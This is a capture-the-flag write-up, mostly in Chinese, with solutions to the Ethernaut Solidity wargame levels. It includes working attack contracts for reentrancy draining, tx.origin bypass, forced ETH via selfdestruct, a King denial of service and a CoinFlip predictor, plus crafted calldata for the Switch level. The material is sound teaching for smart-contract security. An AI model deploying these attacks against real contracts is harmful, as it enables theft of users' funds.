
Tips to [The Ethernaut](https://ethernaut.openzeppelin.com/) of openzeppelin

# Solution

## [01 - Fallback](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)
1. 先调contribute, 再给合约地址transfer资金(调用 receive函数)， 就能直接获取ownership, 然后可调withdraw
2. 可调用contribute 每次转一点ether，贡献金额足够大就能变成owner


## [02 - Fallout](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639)
注释 `/* constructor */` 并不是真的 constructor, 只是一个普通函数，直接调用就能获取ownership，`后一个字母l是数字1`


## [03 - CoinFlip](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)
deploy another contract to calculate the result
传入CoinFlip合约地址，部署CoinFlipSlove合约，调用CoinFlipSlove.guess去猜结果
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipSlove {
  uint256 public consecutiveWins;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinFlipAddr;

  constructor(address _coinFlipAddr ) {
    consecutiveWins = 0;
    coinFlipAddr = _coinFlipAddr;
  }

  function guess() public returns (bool) {
    require(consecutiveWins <= 3, "enough guesses");

    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 flip = blockValue / FACTOR;
    bool side = flip == 1 ? true : false;

    bool r = CoinFlip(coinFlipAddr).flip(side);

    if (r) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


## [04 - Telephone](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)
deploy another contract to attack
solitidy 文档也强调声明了不要使用[tx.origin](https://docs.soliditylang.org/en/v0.8.20/security-considerations.html#tx-origin) 来做鉴权
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
  function attack(address _telephoneAddr, address _owner) public {
    Telephone(_telephoneAddr).changeOwner(_owner);
  }
}
```


## [05 - Token](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)
数值越界问题, transfer 超过msg.sender balance数量的value，msg.sender会出现超大的余额(负值被解析成了uint类型)
```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```


## [06 - Delegation](https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58)
[delegatecall](https://solidity-by-example.org/delegatecall/)
When contract A executes delegatecall to contract B, B's code is executed
with contract A's storage, msg.sender and msg.value.
所以，当调用Delegation 执行 pwn() 时，改变的owner并不是Delegate的owner，实际是Delegation的owner
并且，delegatecall时，msg.sender and msg.value 是调用 Delegation 的sender，是实际交易发起者


## [07 - Force](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575)
不能使用常规transfer方法给 Force address 转ETH，因为合约没有receive 方法， 也没有fallback 方法
但任何地址能被迫接收ETH当一个合约调用 [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) 方法，合约剩余的ETH会被转移到指定地址
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function attack(address _forceAddr) external {
        selfdestruct(payable(_forceAddr));
    }
    receive() external payable {}
}
```


## [08 - Vault](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)
eth_getStorageAt 能够获取到password的值


## [09 - King](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)
contract 成为king之后，不接受ETH，游戏就会卡在这里，无法继续下去
```solidity
contract KingAttack {
    function attack() external payable {
        require(msg.value == 1 ether, "please send exactly 1 ether");
        // claim throne
        // use call here instead of challenge.transfer because transfer
        // has a gas limit and runs out of gas
        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "cannot claim my throne!");
    }
}
```


## [10 - Reentrance](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)
仅 solidity 0.8.0版本之前的合约可以进行攻击, 因为 Solidity v0.8.0 引入了 [implicit overflow/underflow check](https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html)
还有一个点需注意， Reentrance 若使用 `transfer` 替换 `(bool result,) = msg.sender.call{value:_amount}("");` 也无法攻击， 
因为 `address.transfer() has a gas limit of 2100. Its enough for emitting an event but not enough for victim.withdraw() `
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttact {
    Reentrance holder;
    uint256 initialAmount;

    constructor(address _holder) public {
        holder = Reentrance(payable(_holder));
    }

    function attack() external payable {
        initialAmount = msg.value; 
        holder.donate{value: initialAmount}(address(this));

        callWithdraw();
    }
    
    receive() external payable {
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 leftover = address(holder).balance;
         bool keepRecursing = leftover > 0;

        if (keepRecursing) {
            uint256 amount = initialAmount > leftover ? leftover : initialAmount;
            holder.withdraw(amount);
        }
    }
}
```
[参考](https://ethereum.stackexchange.com/questions/119737/recreating-a-re-entrancy-attack-but-transaction-failed-reverted-why)


## [28 - GatekeeperThree](https://ethernaut.openzeppelin.com/level/0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882)
`gateOne`: EOA调用合约调用`GatekeeperThree.enter`
`gateTwo`: 设置`allowEntrance`, `trick.password`可通过`getStorageAt`获取
`gateThree`: 通过`construct0r`设置owner，owner是合约，不包含`receive`或者`fallback`函数，send就会失败，返回false

## [29 - Switch](https://ethernaut.openzeppelin.com/level/0xb2aBa0e156C905a9FAEc24805a009d99193E3E53)
Switch.sol中`calldatacopy`和`address(this).call(_data)`使用的数据并不相同，函数的`calldata`包含`function selector` + `encode parameter data`, 而`_data`是解析之后的`parameter`.
拷贝68的起始位置， 拷贝 4bytes，正好是`_data`中代表`function selector`的数据, 要求数据为`offSelector`, 但为了达到目标，我们call需要真实调用`turnSwitchOn`，解决这个问题，需要假造`calldata`数据如下
```bash
    // _data is "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
    
    --> function flipSwitch selector
    30c13ade
    --> offset, now = 96-bytes
    0000000000000000000000000000000000000000000000000000000000000060
    --> extra bytes
    0000000000000000000000000000000000000000000000000000000000000000
    --> Offset 68 (where the check occurs)
    20606e1500000000000000000000000000000000000000000000000000000000
    --> length 4 bytes 
    0000000000000000000000000000000000000000000000000000000000000004
    --> Data (function turnSwitchOn signature)
    76227e1200000000000000000000000000000000000000000000000000000000
```